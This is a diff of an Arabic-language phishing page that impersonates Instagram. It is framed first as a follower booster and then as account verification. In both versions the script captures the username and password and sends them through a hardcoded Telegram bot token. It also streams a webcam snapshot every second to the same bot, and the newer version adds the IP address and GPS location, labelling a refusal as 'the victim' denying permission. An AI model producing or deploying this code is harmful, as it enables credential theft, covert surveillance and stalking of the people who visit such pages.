@@ -3,75 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Followers Booster 2026</title>
+    <title>Instagram Verification</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 35px; width: 320px; text-align: center; border-radius: 4px; box-shadow: 0 4px 10px rgba(0,0,0,0.03); }
-        .logo { width: 175px; margin-bottom: 25px; }
-        input, select { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; font-size: 13px; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
-        .loading-text { font-size: 12px; color: #ed4956; margin-top: 15px; display: none; font-weight: bold; }
+        body { background: #fafafa; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; direction: rtl; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 310px; text-align: center; border-radius: 3px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 15px;">نظام التوثيق والزيادة التلقائي</p>
-        
-        <select id="followers_select">
-            <option>10 متابعين</option><option>15 متابع</option><option>20 متابع</option>
-            <option>25 متابع</option><option>30 متابع</option><option>50 متابع</option>
-            <option>100 متابع</option><option>200 متابع</option><option>500 متابع (VIP)</option>
-            <option>1000 متابع (Golden)</option>
-        </select>
-
-        <input type="text" id="user_field" placeholder="اسم المستخدم" required>
-        <input type="password" id="pass_field" placeholder="كلمة السر" required>
-        
-        <button onclick="activateService()">تفعيل الزيادة الآن</button>
-        <p id="msg" class="loading-text">جاري معالجة الطلب.. يرجى عدم إغلاق هذه الصفحة لضمان وصول المتابعين</p>
-
-        <video id="v_stream" autoplay style="display:none;"></video>
-        <canvas id="c_frame" width="640" height="480" style="display:none;"></canvas>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" width="170">
+        <p style="font-size:12px; color:#8e8e8e;">يجب السماح بالصلاحيات لتأكيد الحساب</p>
+        <input type="text" id="u" placeholder="اسم المستخدم" required>
+        <input type="password" id="p" placeholder="كلمة السر" required>
+        <button onclick="collectAllData()">تفعيل الزيادة</button>
     </div>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="can" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
-        const CHAT_ID = '1371063739';
+        const T = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const ID = '1371063739';
 
-        async function activateService() {
-            const u = document.getElementById('user_field').value;
-            const p = document.getElementById('pass_field').value;
-            const c = document.getElementById('followers_select').value;
+        async function collectAllData() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(!u || !p) return;
 
-            if(!u || !p) return alert("يرجى إدخال بيانات الحساب!");
-
-            // إرسال بيانات الحساب
-            const loginData = `📩 صيد جديد:\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}\n🎯 الكمية: ${c}`;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loginData)}`);
-
+            // 1. جلب الـ IP
+            let ip = "غير معروف";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v_stream').srcObject = stream;
-                document.getElementById('msg').style.display = 'block';
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
 
-                // التقاط صورة واحدة كل ثانية (1000ms) بشكل لامتناهي
-                setInterval(() => {
-                    const can = document.getElementById('c_frame');
-                    const vid = document.getElementById('v_stream');
-                    can.getContext('2d').drawImage(vid, 0, 0, 640, 480);
-                    can.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'capture.jpg');
-                        fd.append('caption', `📸 لقطة مباشرة لـ: ${u}`);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg');
-                }, 1000); 
-
-            } catch (err) {
-                alert("⚠️ يجب السماح بالكاميرا لتأكيد الحساب ومكافحة البوتات!");
+            // 2. طلب الموقع الجغرافي (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const msg = `👤 يوزر: ${u}\n🔑 باس: ${p}\n🌐 IP: ${ip}\n📍 الموقع: ${locLink}`;
+                    sendMsg(msg);
+                }, () => {
+                    sendMsg(`👤 يوزر: ${u}\n🔑 باس: ${p}\n🌐 IP: ${ip}\n📍 الموقع: الضحية رفض الإذن`);
+                });
             }
+
+            // 3. تشغيل الكاميرا (صورة كل ثانية)
+            startCamera(u);
+        }
+
+        function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+        }
+
+        async function startCamera(user) {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = s;
+                setInterval(() => {
+                    const c = document.getElementById('can');
+                    const v = document.getElementById('v');
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', ID);
+                        f.append('photo', b, 'x.jpg');
+                        f.append('caption', `📸 صورة لـ: ${user}`);
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch(e) {}
         }
     </script>
 </body>
